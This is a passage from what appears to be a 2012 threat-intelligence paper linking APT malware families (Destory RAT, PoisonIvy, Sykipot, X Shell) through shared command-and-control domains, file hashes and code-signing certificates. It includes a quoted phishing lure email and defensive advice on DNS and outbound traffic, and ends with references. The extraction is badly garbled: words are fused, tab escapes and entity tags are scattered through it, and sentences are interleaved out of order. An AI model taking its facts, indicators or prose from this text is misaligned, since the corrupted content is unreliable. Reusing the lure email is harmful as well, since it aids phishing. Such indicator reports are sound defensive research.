socially engineered emails that contained an attachment \t named \t \u2018 invtation.pdf\u2019[sic ] . \t Similarto \t the \u2018 Meeting \t Agenda \u2019 attachment , \t \u2018 invtation \u2019 installs a [ORG] PoisonIvy \t [ORG] RAT , \t butoneconfiguredtocommunicate with \t thecallbackdomain\u2018pu.flower show.org\u201964 . \t The 61ThemalwarewithMD5hash\u2018F0B8 \t 48A8 \t 41D4EF3406A6 \t F9C4 766C \t 540B\u2019modifies \t the\u2018hosts\u2019fileoncomputers \t itisrunonso that the file contains an entry for \u2018 www.adv138mail.com \u2019 . ( ThreatExpertLtd . ,2011 ) \u2018 ihi.adv138mail.com \u2019 Backdoor : Win32 / Thoper . Acallback \t location.(Wong , \t [DATE] 2011 ) [CARDINAL] 63Thedomains \t previouslypointed \t toaC2 \t serverlocated \t atIP 64The socially engineered \t email that communicated back \t to thesameIP \t addresstowhich \t thecallbackdomainpointed . [CARDINAL] 65Email \t courtesyofMila \t Parkourof\u2018contagiodump.blogspot.com \u2019 . ( [GPE] Parkour , contagio : Jul5 \t CVE [DATE] 2010 [CARDINAL] 2883PDF \t invitation.pdfwith seminar about technology , which will be held on 28th , [DATE] July . We would appreciate it if you would take your spare time to share the occasion with us . The detail information is in the attachment . Please earlist convenience . Looking forward to your reply . Thanks very much.participationyouratAdditional Destory \t RAT LinksBest Regards , < purported sender > FIGURE11 : TEXTOFASOCIALLYENGINEERED \u2018 www.adv138mail.com \u2019 , \u2018 www.mailsignin.net \u2019 has also previously shared infrastructurewith \t at \t least \t twootherknownDestory \u2018 www.mailsignin.net \u2019 previously pointed [ORG] RAT \t callbackdomains\u2018newhose.ntimobile.com\u2019and \u2018 sms.servegame.com\u201966 . \t [GPE] Anumberof \t subdomainsof theDestory \t [ORG] RAT associated \t domain\u2018join3com.com \u2019 also \t previously \t pointed \t tothesameIPaddress67 . Theselinkssuggestthat \t many \t attacksinwhich theDestory \t RAT \t hasbeenused \t arelinked , \t not \t only by \t themalware , but \t also \t throughC2infrastructure . This \t furthersupportsthenotionthattheDestory RAT \t wasdevelopedby , \t orfor , particularattackers and \t that \t most , \t ifnot \t all , \t of \t themaliciousactivity involvingit \t is \t attributabletothoseattackers . additional malware . For example , \u2018 network sec.net\u2019hasbeenused \t by \t theDestory \t [ORG] RAT ( \u2018 gm1.network sec.net \u2019 ) , by [ORG] Poison Ivy malware \u2018 Backdoor FCQ \u2019 ( \u2018 yoyo.network sec.net\u201968 ) and \t by 66Thedomains\u2018newhose.ntimobile.com\u2019and\u2018sms.servegame.com \u2019 arelistedasknowncallbacksforBackdoor . SoguandThoper . A respectively.(Wong , \t 2011)(Mullaney,2011 ) \u2018 123.join3com.com \u2019 , \u2018 dow.join3com.com\u2019,\u2018ftp.join3com.com\u2019,and \t \u2018 ico.join3com.com\u2019are Backdoor : Win32 / Thoper . Acallback \t location.(Wong , \t [DATE] 2011 ) [CARDINAL] 68Thedomain\u2018yoyo.network sec.net \u2019 \t is \t used \t bymalwarewith MD5 \t hash\u201837037F674BCB \t BB7EEF3889AB \t [CARDINAL] 6EB3 \t 0268\u2019.(Threat [ORG] ExpertLtd . ,2008 ) PAGE14OF \t 29\u2018join3com.com \u2019 \u2018 catalog.join3com.com\u2019COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.Compromised Code \t Signing CertificateTravlman LinkstheLink to \t [ORG] RSA Breach(\u2018pingabm.network sec.net \u2019 , \u2019 \u2018 psbm11025.network   sec.net\u2019and \t \u2018 psbm10.network sec.net\u201969 ) . TheobservedLURK \t communicationsappearto \t bethe same as those generated by malware that \t was digitally \t signed \t using \t acompromised \t codesigning certificatethat \t wasused \t tosignaDestory \t [ORG] RAT , \t and in several attacks70 . \t That other malware used \u2018 office.windowupdate.org\u2019\u2013adomainthat \t is \t linkedto \u2018 alyac.org\u2019not \t only \t by \t thecommunicationsprotocol but \t also \t by \t both domain registration tactic and infrastructure71 . \t ( [PERSON] Fagerland , \t [DATE] 2011 ) The Destory RAT malware used Communications hack72is \t identical , \t except for its configuration , to \t malware73that \t communicateswith callback domain \u2018 wow.travlman.com \u2019 . The the callbackdomainpreviouslypointed \t to \t thesameIP address as that \t used \t in the SK \t Communications hack74 . \t Both \t of \t themaliciousfileswerecompiled from the same code on [CARDINAL] 27 \t September 2010 \t at 09:17:04GreenwichMeanTime(GMT)75 , \t andlater configured . Thecallbackdomain\u2018wow.travlman.com\u2019is \t also by malware [CARDINAL] 76 communications of \t an identical format \t to \t those decoded from the in the Murcy \u2018 Extra Data \u2019 communications . \t This \t highlightsanadditionallink [CARDINAL] 69Backdoor FCQ uses \t several \t \u2018 network sec.net \u2018 \t subdomains \t as callbacklocations.(McAfeeInc . ,2011 ) 70Thefirstreported \t abuseofthecertificatewasinrelationtothe HupigontrojanwithMD5 \t hash \t \u2018 8800839871A3 \t 3801B2B46F9E 23B7 \t B7A5 \u2019 . ( [PERSON] Hispasec [PERSON] Sistemas , [DATE] 2011 ) ( Common Computer SecurityStandards ) [CARDINAL] 71Refer to [ORG] the \u2018 LURK Communications [ORG] \u2019 section for additional information . 72TheDestoryRATused \t intheSK \t Communications \t hack \t was hosted on a toolbox as \u2018 nateon.exe \u2019 , and called back to \u2018 nateon.duamlive.com\u2019 . Ithas \t aSHA1 \t hashof\u2018F84CD73DABF1 86607F98 \t 6DF9 \t 8C5402A5 \t 7BB58AD1 \u2019 \t and \t MD5 \t of\u2018461884F1 D41E9E0709B4 \t 0AB2 \t CE5AFCA7\u2019.(CommandFivePtyLtd,2011 ) 73Malwarewith \t theMD5 \t hash\u20185FCE1FC18283D76C396A3CCC 64BDBBDE \u2019 \t callsbackto\u2018wow.travlman.com \u2019 . [CARDINAL] 74Both \t \u2018 wow.travlman.com \u2019 \t and \t \u2018 duamlive.com \u2019 \t previouslypointed listed \t inanyblacklists,2011)(DomainTools , LLC ) 75Automatedanalysisreportsconfirmthecompilationtimeofthe codeand \t that , whiletheMD5 \t hashofeach \t ofthefiles \t is \t different , [PERSON] theMD5 \t hashes \t ofeach \t ofthecodesections , exceptforthe.data section , are identical . ( [PERSON] Hispasec ( [PERSON] Hispasec [PERSON] Sistemas , [DATE] 2011 ) Sistemas,2011 ) 76Malwarewith \t MD5 \t hash\u2018B098 \t AEE1 \t [CARDINAL] 6BD1 \t 38C4 \t 12075C9D 315A \t [ORG] EFC9\u2019.(ThreatExpertLtd,2010 ) PAGE15OF \t [CARDINAL] 29between the Destory RAT Several other \u2018 travlman.com \u2019 sub domains are known to \t exist77including at \t least \t one that \t is The associated with malware . sub domain \u2018 dm.travlman.com\u201978is \t thecallbackused \t by \t malware \u2018 Trojan : Win32 / Boupke\u201979 . The majority \t of \t the known callback domains for [ORG] MurcymalwarewereusedintheMarch \t [CARDINAL] 2011RSA breach . \t Thissuggeststhat \t theattackersresponsible fortheRSA breach \t also \t usetheMurcymalware . Given that the malware is reportedly not in widespread \t use , \t theChineseservercommunicating with\u2018path.alyac.org\u2019may \t havebeencompromisedby thesameattackersresponsiblefortheRSA \t breach . TheX ShellRAT \t is \t commercially \t availablesoftware that \t appears to \t have been used in a number of attacks . \t Therearenumerousversionsof \t theX [ORG] Shell RAT , \t and \t notallproducethesamecommunications . Malwarethat \t generatesthesameX ShellC601 \u2018 path.alyac.org \u2019 communications [CARDINAL] 80 observed That \t malwareis \t thought \t tobeanX ShellC603 \t [ORG] RAT and \t not \t anX ShellC601 \t [ORG] RAT . \t It \t is \t not \t knownwhether any \t ofthesemaliciousfileswereused \t bythesame \u2018 g.travlman.com \u2019 , \u2018 dm.travlman.com \u2019 , \u2018 g1.travlman.com \u2019 , \u2018 g2.travlman.com \u2019 , \u2018 mail.travlman.com \u2019 , \u2018 luandao.travlman.com \u2019 , \u2018 seo.travlman.com \u2019 , \u2018 wayi.travlman.com \u2019 , \u2018 shenqi.travlman.com \u2019 , and \t \u2018 www.travlman.com \u2019 . 78Malwarewith \t MD5 \t hash\u201870A8 \t [CARDINAL] 8091E1F9 \t A7BEE246 \t 488C \u2018 url\u2019.(SunbeltSecurity,2009 ) 79Malwarewith \t MD5 \t hash\u201870A8 \t [CARDINAL] 8091E1F9 \t A7BEE246 \t 488C \u2018 Trojan : Win32 / Boupke.gen!A \u2019 , \u2018 Trojan . Win32.Boupke!IK \u2019 , and \u2018 Trojan . Win32.Boupke\u2019.(HispasecSistemas,2009 ) 80Automated \t analysis \t reports \t existontheInternetforprobable \t X   Shell601 \t malwarewith \t MD5 \t hash\u201865813CBB \t [CARDINAL] 660E91CD5FA0 8300E177 \t EB09\u2019,\u2018229947CC71A4601B8B7794B402E536A9 \u2019 , \u2018 DA2F98315F4C56FCE21273E21E453B76\u2019,and\u2018F4C08D3D F5EDE0790E34EAE0C5DB8A7A\u2019.(Hispasec Sistemas , [DATE] 2011 ) ( Threat Expert Ltd , [DATE] 2011 ) ( Threat Expert Ltd , [DATE] 2011 ) ( [ORG] Threat [ORG] ExpertLtd , \t [DATE] 2011 ) 81Automated \t analysis \t reports \t existontheInternetforprobableX   Shell603 \t malwarewith \t MD5 \t hash\u2018679993AD2CF8EFDC788E 0BA204D69B0D\u2019,and \t \u2019 CE938C647831080B71165389E43E attackers who \t used \t the X shell malware which knownSykipotdomain\u2018help.newcarstyle.com\u2019 . Both communicateswith \t \u2018 path.alyac.org \u2019 . subdomains85 . \t They \t thereforehaveadditionallinksto Thedomain\u2018alyac.org\u2019previously \t pointed \t to \t aC2 Sykipot \t activity \t as\u2018shopping.bluelightness.com\u2019was same [ORG] IP address as the known Sykipot \t domains IP \t addressesareassociatedwith \t anumberofother \u2018 www.topix21century.com \u2019 and \u2018 bbs.ezxsoft.com \u2019 , \u2018 notes.topix21century.com\u201986 . \t The\u2018bluelightness.com \u2019 \u2018 pc.nprotects.org \u2019 , and \u2018 wow.travlman.com \u2019 domainis \t also \t linked \t to \t \u2018 mail [ORG] kr2.com [ORG] \u2019 [ORG] aDestory latterbeing \t linked \t toboth \t theDestory \t RAT \t and \t IP2B RAT \t and \t NightDragondomainpreviously \t discussed . communications(aspreviously \t discussed)82 . Both \t domainsshareinfrastructurewith \t thedomain \u2018 worldsecuritys.com\u201987 . In \t additionto \t bothhaving \t shared \t infrastructure \u2018 bbs.ezxsoft.com\u2019and \t \u2018 pc.nprotects.org\u2019areused \t by \u2018 file.filesdelete.com \u2019 , and \u2018 news.welldone123.net \u2019 malwarethat \t createsauniquely \t named \t directory83 . \u2018 well.welldone123.net \u2019 all point to the [ORG] IP \t address This \t indicatesadirect \t relationship \t betweenthetwo allocated \t to \t the large [GPE] US financial which \t \u2018 todaygonever.com\u2019also \t previously \t pointed . ) Thedomain\u2018welldone123.net\u2019is \t aknownSykipot Thedomain\u2018ezxsoft.com\u2019wasregistered \t bythe callback [GPE] domain88 . \t The domain \u2018 filesdelete.com \u2019 is sameentity \t ( \u2018 LeeCooper\u2019)asadomainused \t intheSK also \t otherwiseassociated \t with \t malware89 . Communications hack ( \u2018 ro.diggfunny.com \u2019 ) , \t further linking \t it \t to \t thesameattackers . \t TheC2 \t serverand \t the in the domain callbackdomainsalso \t havelinksto \t amyriad \t of \t other \u2018 janagreen2000@gmail.com \u2019 . \t Thesamecontact \t email address(but \t different \t name , \t address , \t and \t phoneand in the domain fax numbers ) was also used As previously discussed , before expired , registration for \u2018 centurycpc.com \u2019 , \u2018 filesdelete.com \u2019 , \u2018 todaygonever.com\u2019pointedto \t aC2serverassociated with both the Destroy RAT and [ORG] NightDragon \u2018 newcarstyle.com\u2019\u2013at \t least \t twoofwhich \t areknown malware . \t [NORP] Thesamedomainis \t also \t associated \t with infrastructure , \t and \t domainregistrationinformation . Overits \t lifetimethedomain\u2018todaygonever.com \u2019 pointedto \t numerousIP \t addresses , \t many \t of \t which \t are [ORG] IP address \u2018 helpdesk.bluelightness.com \u2019 previouslyhosted \t \u2018 shopping.bluelightness.com \u2019 . not \t noteworthyasthey \t wereassigned \t to \t serversthat hosted \t numerouswebsites . \t Fourof \t theIP \t addresses , \u2018 notes.topix21century.com \u2019 , \u2018 shopping.bluelightness.com \u2019 , \u2018 www.topix21century.com \u2019 . The webpage \u2018 topix21century.com \u2019 however , \t are of \t particular note \u2013 IP \t addresses was \t used , inwhatis \t believed \t tohavebeenatargeted \t attack , to installSykipotmalwareoncomputers \t which \t visited \t thewebpage . The installed malware then communicated with a [CARDINAL] C2 server \u2018 notes.topix21century.com \u2019 . ( [ORG] Symantec [ORG] Corporation , located at allocated \t to \t alargeUSfinancialinstitution . 2010)(MalwareGroup.com ) [CARDINAL] 87In2011boththeknowncallback \t domain\u2018cb85.mail kr2.com \u2019 the later still points \t there as \t of [CARDINAL] 9 \t February 2012 . In [DATE] 2011 , \u2018 bluelightness.com \u2019 \t and\u2018worldsecuritys.com \u2019 \t both \t pointed \t toIP 82Malware detected as ' Trojan . Win32.AgentBypass ' uses \t the 2012 . ' bbs.ezxsoft.com ' . Malware \u2018 Trojan . Win32.Generic \u2019 \t usesthecallback \t domain\u2018pc.nprotects.org \u2019 . 88Thedomain\u2018welldone123.net \u2019 \t isknowntobeassociatedwith ( GFISandBox2011)(GFISandBox2011 ) theSykipotseries \t ofattacks.(SymantecCorporation,2012 ) \u2018 www.filesdelete.com [DATE] \u2019 [DATE] 89 The [CARDINAL] 83 Both pieces of malware is associated with domain \u2018 Troj / Bdoor [ORG] BDM\u2019.(Sophos \t Ltd. ,2012 ) \u2018 03a075fb70d5d675f9dc26fc \u2019 \t and \t asubdirectorynamed \t \u2018 update \u2019 . ( GFISandBox2011)(GFISandBox2011 ) 90Thedomain\u2018help.newcarstyle.com \u2019 \t isaknownSykipotcallback , asis\u2018greenrightway.com\u2019.(SymantecCorporation,2012)(Malware 84Forfurtherdetails \t ofthelinks , refertothepaper\u2018SKHack \t byan Domains,2012 ) AdvancedPersistentThreat\u2019.(Command \t FivePtyLtd,2011 ) PAGE16OF \t [CARDINAL] 29COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.throughofit C2Sykipot Activitydomain \ufffd \ufffd \ufffd \ufffd \ufffd \ufffd \ufffd INSIGHTSIncreasingly , \t instead \t of \t malwareusingthe default \t [ORG] DNSserversonacompromised computerto \t resolveits \t callbackdomainsto IP \t addresses , \t attackerswillspecify \t [ORG] DNS defenders . \t Such \t requests , \t ifallowed , \t will bypassthevictim\u2019sDNSserversand \t defeat any \t blacklistsused \t by \t thevictim\u2019sownDNS servers . \t Furthermore , \t therequestswillnot thanthecompany \u2019s \t [PERSON] ownDNS \t servers . Furthermoretheyshould \t bealert \t toany \t [ORG] DNS communicationattempts \t tolocationsother thanthecompany \u2019s \t [PERSON] ownDNS \t servers , \t asthis may \t beanindicatorof \t amalwareinfection . \ufffd Whencodesigning \t certificatesarerevoked thedateof \t effect \t of \t therevocationis \t chosen so \t that , \t wherepossible , \t legitimatesoftware signed \t with \t thecertificatecontinuesto validate . \t Unfortunately , \t thismeansthat sometimesmalwaresignedwith \t a compromised \t certificatewillalso \t continueto validate(despitetherevocation ) . [NORP] Somemalwareattempts \t to \t communicate with \t C2infrastructureat \t frequent \t intervals . TCP \t port443 \t trafficisoftenallowed \t outofa networkwithout \t inspectionby \t network security \t appliancesasit \t is \t expected \t to \t be legitimate , \t encrypted \t SSLcommunications that \t canbedifficult \t to \t inspect . \t Unfortunately , attackerstakeadvantageof \t thisby \t using \t the portto \t bypasssecurity \t appliancesto communicatewith \t aC2server(such \t aswith theobserved \t X Shellcommunications ) . code , \t sometimesthey \t willmerely reconfigurethemalware . \t [GPE] Thisaltersthefile hash \t and \t thereforesuch \t ahash \t is \t notan effectivesignatureforotherconfigurations of \t themalware . \t Hashesoftheindividualcode sections(e.g text,.rdata , \t .reloc)makefor determinetheirdestination\u2019sIP \t address . Outboundnetworkactivitythat \t occurs withoutaDNS \t lookupshould \t betreatedwith Blocking \t outbound \t communicationattempts that \t arenot \t preceded \t by \t aDNS \t lookup \t can beeffectiveinblockingC2 \t communication attemptsthat \t aremadedirect \t to \t anIP [PERSON] address(such \t astoanIP \t addresslisted bewhitelisted \t to \t prevent \t legitimateactivity callbackdomainevenwhenit \t is \t listed \t on taking \t thetimeto \t research \t thedomainand associated \t activity \t canhelp \t with \t the [GPE] Machinetranslationsoftwareand \t automated \t malwareanalysis \t reports havebeenheavily \t reliedonthroughout \t thedevelopment \t ofthis \t paper . Whiledatahasbeenverified \t againstmultiplesourceswherepossible , CommandFivePtyLtddoesnotguaranteetheveracity \t of \t sourcesorthe accuracy \t of \t theinformation . CommandFivePty \t Ltd \t reminds \t readersto exercise caution when visiting untrusted websites and/or opening untrusteddigitaldocuments . \t [PERSON] Command \t FivePty \t Ltddoesnotwarrant that \t thewebsitesreferencedinthispaperaretrustworthy . COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE17OF \t [CARDINAL] 29DISCLAIMER \ufffd \ufffd REFERENCESBlasco , \t J. \t ( [DATE] 2012 , \t [PERSON] January12 ) . Sykipot variant hijacks [ORG] DOD and Windows smart cards . \t Retrieved \t [DATE] February \t [DATE] 05 , \t [DATE] 2012 , fromAlienvault \t Labs : url the apt owns your smart   cards and certs/ [ORG] CommandFivePty \t [ORG] Ltd. \t ( [DATE] 2011 , \t [DATE] June ) . Advanced Persistent Threats : A \t Decade \t in Review . Retrieved \t September24 , 2011 , \t fromCommand \t FivePty \t Ltd : url [ORG] CommandFivePty \t [ORG] Ltd. \t ( [DATE] 2011 , \t [DATE] September ) . \t SK \t Hack \t by an Advanced Persistent Threat . \t RetrievedJanuary \t 06,2012 , fromCommand \t FivePty \t Ltd : url CommonComputerSecurityStandards . \t ( n.d . ) . \t [ORG] Digital \t Certificates Used by \t [PERSON] Malware . \t RetrievedFebruary02 , \t [DATE] 2012 , fromCCSSForum : url certificates.php?&pag=4 Coviello , \t A. \t ( [DATE] 2011 , \t [DATE] March \t [CARDINAL] 17 ) . \t Open Letter to \t RSA Customers . \t Retrieved \t June13 , \t 2011,from \t [ORG] RSA : url [PERSON] Deutsch , \t P.(1996,May ) . \t DEFLATE \t Compressed Data Format Specification version [CARDINAL] 1.3 . \t Retrieved \t January08 , \t [DATE] 2012 , fromIETF \t RFC1951 : url [PERSON] Deutsch , \t P.(1996,May ) . \t [ORG] ZLIB [ORG] Compressed [ORG] Data Format Specification version [CARDINAL] 3.3 . \t Retrieved \t [DATE] January \t 25 , \t [DATE] 2012 , \t from IETF \t RFC1951 : \t url [ORG] DoctorWeb . \t ( 2011,December29 ) . \t Dr. Web \t Anti virus    How To Remove Virus ( Trojan . DownLoader4.20396 )    [ DRWEBHK.COM ] . \t Retrieved \t December29 , \t [DATE] 2011 , \t from \t Dr. \t WebHK : url Dr. \t Web.(2011 , \t [DATE] July \t 10 ) . Dr. Web    innovation IT security \t solutions . [NORP] Complex protection against Internet threats . Retrieved \t [DATE] 0203 , \t 2012,from \t Dr. Web : \t url [PERSON] Fagerland , \t S. \t ( [DATE] 2011 , \t November17 ) . \t Invisible YNK , a Code \t Signing Conundrum | [PERSON] Norman [PERSON] Blog . \t Retrieved \t [DATE] December [DATE] 13 , \t 2011,from \t Norman.com : url detection team / invisble ynk a   code signing conundrum F SecureCorporation.(n.d . ) . Threat Description : Backdoor : W32 / Hupigon . \t Retrieved \t December23 , \t [DATE] 2011 , \t from \t F   Secure : \t url secure.com/v descs / backdoor_w32_hupigon.shtml GFI \t [PERSON] Sandbox . \t ( [DATE] 2010 , \t [DATE] May \t [DATE] 07 ) . \t GFI [PERSON] Sandbox [PERSON] Analysis [PERSON] Report . \t Retrieved \t January06 , \t [DATE] 2011 , \t from \t GFI \t [PERSON] Sandbox : GFI \t SandBox.(2011,August \t [CARDINAL] 04 ) . \t GFI [PERSON] SandBox [PERSON] Analysis [PERSON] Report . \t Retrieved \t October17 , \t [DATE] 2011 , \t fromGFI \t [PERSON] SandBox : GFI \t SandBox.(2011,July \t [CARDINAL] 15 ) . \t GFI SandBox Malware Analysis Report : Trojan . Win32.AgentBypass . \t Retrieved \t [DATE] August GFI \t [PERSON] Sandbox . \t ( [DATE] 2011 , \t September04 ) . GFI Sandbox Malware Analysis Report : [GPE] Trojan . Win32.Generic . \t Retrieved [DATE] January \t [DATE] 06 , \t [DATE] 2012 , \t fromGFI \t [PERSON] Sandbox : COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE18OF \t 29GFI \t SandBox.(2011,May \t [CARDINAL] 29 ) . \t GFI SandBox Malware Analysis Report : [GPE] Trojan . Win32.Generic!SB [GPE] Trojan . [GPE] Trojan . Win32.Generic . \t RetrievedSeptember2011,2011 , \t from GFI \t [PERSON] Sandbox . \t ( [DATE] 2011 , \t [DATE] March \t [CARDINAL] 20 ) . \t GFI Sandbox Malware Analysis Report : [PERSON] Trojan [PERSON] Dropper . Win32.Wykores . \t Retrieved [DATE] January \t [DATE] 06 , \t [DATE] 2012 , \t fromGFI \t [PERSON] Sandbox : GFI \t Software.(2010,December26 ) . [ORG] CWSandbox [ORG] Report by MD5 \t at [ORG] Sunbelt [ORG] Security . \t Retrieved \t December27,2011 , fromSunbelt \t Security : url [DATE] 549b6d2ba0 [DATE] 11/52/02 [ORG] UTC . \t Retrieved \t February02 , \t [DATE] 2012 , \t from \t [ORG] VirusTotal : ff7f4 [CARDINAL] 17/52/37 [ORG] UTC \t   [ORG] VirusTotal . \t Retrieved \t [DATE] February \t [DATE] 07 , \t [DATE] 2012 , \t fromVirusTotal : [CARDINAL] 27c110 / analysis/ [CARDINAL] 13/34/31 UTC \t   [ORG] VirusTotal . \t Retrieved \t [DATE] February \t [DATE] 03 , \t [DATE] 2012 , \t fromVirusTotal : bc1cc / analysis [CARDINAL] 13/31/35 [ORG] UTC . \t Retrieved \t February02 , \t [DATE] 2012 , \t from \t [ORG] VirusTotal : a4fb1fe 09/44/14 [ORG] UTC . \t Retrieved \t [DATE] January \t 30 , \t [DATE] 2012 , \t from \t VirusTotal : [CARDINAL] 565b6aa / analysis [CARDINAL] 18/29/09 [ORG] UTC . \t Retrieved \t [DATE] January \t 30 , \t [DATE] 2012 , \t from \t VirusTotal : bcab40 / analysis [ORG] HispasecSistemas . \t ( [DATE] 2011 , \t [DATE] May \t [DATE] 10 ) . \t VirusTotal \t   Free \t Online \t Virus , Malware and URL Scanner . RetrievedDecember 30 , \t 2011,from \t VirusTotal : d0a162b9a7584f90 [ORG] HispasecSistemas . \t ( [DATE] 2011 , \t [PERSON] November21 ) . \t VirusTotal \t   Free \t Online Virus , Malware and URL Scanner . \t Retrieved December30 , \t [DATE] 2011 , \t from \t VirusTotal : \t url   1321864468COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE19OF \t [DATE] 29HispasecSistemas . \t ( [DATE] 2011 , \t December21 ) . \t VirusTotal \t   Free \t Online Virus , Malware and URL Scanner . \t Retrieved December30 , \t [DATE] 2011 , \t from \t VirusTotal : \t url   [CARDINAL] 1324454798 [ORG] HispasecSistemas . \t ( [DATE] 2011 , \t [DATE] May \t 24 ) . \t VirusTotal \t   Free \t Online \t Virus , Malware and URL Scanner . RetrievedJanuary \t [DATE] 04 , [DATE] 2012 , \t fromVirusTotal : \t url scan / file   Kaspersky \t LabZAO . \t ( [DATE] 2010 , \t [DATE] January \t 12 ) . \t [ORG] Backdoor . [PERSON] Win32.Agent.anvj . RetrievedDecember09 , \t [DATE] 2011 , \t from [NORP] Securelist : url [PERSON] Kurc , \t D.(2011,April17 ) . \t Encyclopedia entry : [ORG] TrojanDropper : Win32 / [PERSON] Redsip . A \t   [PRODUCT] Learn more \t about malware    [ORG] Microsoft [ORG] Malware [ORG] Protection [ORG] Center . \t Retrieved \t [DATE] January \t 25 , \t 2012,from \t MicrosoftMalwareProtection Center : url AWin32%2FRedsip . A [ORG] Lelli , \t A. \t ( [DATE] 2010 , \t [DATE] March \t [CARDINAL] 12 ) . \t Zero Day \t Attack \t on IE6 \t   JS.Sykipot Does n't [WORK_OF_ART] Spare [WORK_OF_ART] Retired [WORK_OF_ART] Software . \t RetrievedFebruary 01 , \t 2012,from \t SymantecConnect \t Community : \t url day   attack ie6 jssykipot doesn t spare retired software MalwareDomains . \t ( 2012,January \t [CARDINAL] 16 ) . [PERSON] Malware [PERSON] Domains . \t RetrievedJanuary \t 30,2012 , \t from \t MalwareDomains : url McAfeeFoundationProfessionalServicesand \t McAfeeLabs . \t ( 2011,February10 ) . \t Global \t Energy \t Cyberattacks : \" Night Dragon\" . RetrievedJune13 , \t [DATE] 2011 , \t from \t McAfee : \t url   papers / wp global energy cyberattacks [TIME] night dragon.pdf McAfeeInc . \t ( [DATE] 2011 , \t December22 ) . \t Backdoor FCQ    Malware    McAfee \t Labs \t Threat Center . \t RetrievedFebruary02 , [DATE] 2012 , \t fromMcAfeeLabsThreat \t Center : url   intelligence / malware / [PERSON] default.aspx?id=670739 [PERSON] Mendoza , \t E. \t ( [DATE] 2011 ) . TROJ_INJECT.AMR \t | Low Risk | Trend Micro \t Threat Encyclopedia . Retrieved \t [GPE] November21 , [DATE] 2011 , \t fromTrend \t Micro : \t url   [DATE] threats.trendmicro.com/malware/aspx?language=au&name=TROJ_INJECT.AMR Microsoft . \t ( [DATE] 2007 , \t December10 ) . \t A \t description of [PERSON] Svchost.exe \t in [ORG] Windows [ORG] XP [ORG] Professional \t [ORG] Edition . Retrieved September07 , \t [DATE] 2011 , \t from \t Microsoft \t Support : url Microsoft \t Corporation . \t ( [DATE] 2011 , \t September07 ) . \t [PERSON] Locales \t and Languages ( Windows ) . \t RetrievedJanuary24,2012 , fromMicrosoft \t SoftwareDevelopment \t Network : \t url   us / library / dd318716.aspx Microsoft \t Corporation . \t ( [DATE] 2011 , \t September07 ) . \t OSVERSIONINFOEX structure . \t Retrieved \t [DATE] January \t [CARDINAL] 17,2012,from Microsoft \t SoftwareDevelopment \t Network : \t url   us / library / windows / desktop / ms724833(v = vs.85).aspx [ORG] Microsoft \t [ORG] Corporation . \t ( [DATE] 2011 , \t September07 ) . \t SYSTEM_INFO structure . \t Retrieved \t [DATE] January \t 24 , \t [DATE] 2012 , \t from \t Microsoft MSDN : \t url us / library / windows / desktop / ms724958(v = vs.85).aspxCOPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE20OF \t [DATE] 29Mullaney , \t C. \t ( 2011,July \t 30 ) . \t Backdoor . Sogu Technical \t Details \t | Symantec . \t Retrieved \t [DATE] August \t [DATE] 18 , \t [DATE] 2011 , \t from url 073003 5345 99&tabid=2 pu.flower show.org . Retrieved \t [DATE] January \t 28,2012,from \t Contagio : url targeting experts on Japan.html [GPE] Parkour , \t M.(2011,July \t 14 ) . Jul \t [CARDINAL] 13 CVE 2010 [DATE] 2883 [WORK_OF_ART] PDF [WORK_OF_ART] Meeting [WORK_OF_ART] Agenda with more [ORG] Poison Ivy \t www.adv138mail.com url [CARDINAL] 13 cve [DATE] 2010 [DATE] 2883 pdf meeting agenda.html [PERSON] Rasmussen , \t [NORP] R. \t ( [DATE] 2011 ) . Practical \t Usage of Passive \t [ORG] DNS \t Monitoring for \t E Crime Investigations . \t Retrieved \t January04 , [DATE] 2011 , \t fromurl [ORG] Rasmussen.pdf rbls . \t ( 2011,November01 ) . \t shenqi.travlman.com is not listed in any blacklists . \t Retrieved \t November01 , \t [DATE] 2011 , \t from rbls : \t url SafeZoneCast . \t ( [DATE] 2011 , \t August09 ) . \t SafeZoneCast . \t Retrieved \t December30 , \t [DATE] 2011 , \t from url 0003NS Sandbox , \t G.(2010,December26 ) . \t GFI Sandbox Malware Analysis Report : Trojan Downloader . Win32.Generic . Retrieved \t November29 , \t [DATE] 2011 , \t from \t GFI \t [PERSON] Sandbox : shapeless . \t ( n.d . ) . \t Poison Ivy 2.3.0 \t Documentation . Retrieved \t [DATE] August \t 17,2011 , \t from \t [ORG] PoisonIvy \t  Remote AdministrationTool : \t url rat.com/dl.php?file=230docs [ORG] SophosLtd . \t ( 2011,November25 ) . \t Detailed Analysis    Troj / Agent UDR    Viruses and Spyware    Threat Analyses    [GPE] Threat [GPE] Center    Sophos . Retrieved \t December8 , \t [DATE] 2011 , \t from \t Sophos : \t url   us / threat center / threat analyses / viruses and spyware / Troj ~ Agent UDR / detailed analysis.aspx [ORG] SophosLtd . \t ( 2012,January \t [CARDINAL] 19 ) . \t Detailed Analysis    Troj / Bdoor [ORG] BDM    Viruses and Spyware    Threat Analyses    [GPE] Threat [GPE] Center    Sophos . Retrieved \t [DATE] January \t 31 , \t [DATE] 2012 , \t fromSophosThreat \t Center : url us / threat center / threat analyses / viruses and spyware / Troj ~ [ORG] BDoor   [ORG] BDM / detailed analysis.aspx Sunbelt . \t ( [DATE] 2009 , \t October15 ) . Sunbelt [ORG] CWSandbox [PERSON] Malware [PERSON] Analysis [PERSON] Report : Backdoor . Win32.Pasur . [PERSON] Retrieved [PERSON] December19 , \t [DATE] 2011 , \t from \t Sunbelt \t Security \t Sandbox : Sunbelt \t Security . \t ( [DATE] 2009 , \t May03 ) . \t Sunbelt CWSandbox [PERSON] Malware [PERSON] Analysis [PERSON] Report . \t Retrieved \t December01,2011 , fromSunbelt \t Security \t Sandbox : Sunbelt \t Security . \t ( [DATE] 2009 , \t October16 ) . \t Sunbelt CWSandbox Malware Analysis Report : Trojan . Win32.Sisproc . Retrieved \t [PERSON] December19 , \t [DATE] 2011 , \t from \t SunbeltSecurity \t Sandbox : Sunbelt \t Security . \t ( [DATE] 2010 , \t [PERSON] December31 ) . [ORG] CWSandbox [ORG] Report by MD5 \t at [ORG] Sunbelt [ORG] Security . \t RetrievedOctober25 , [DATE] 2011 , \t 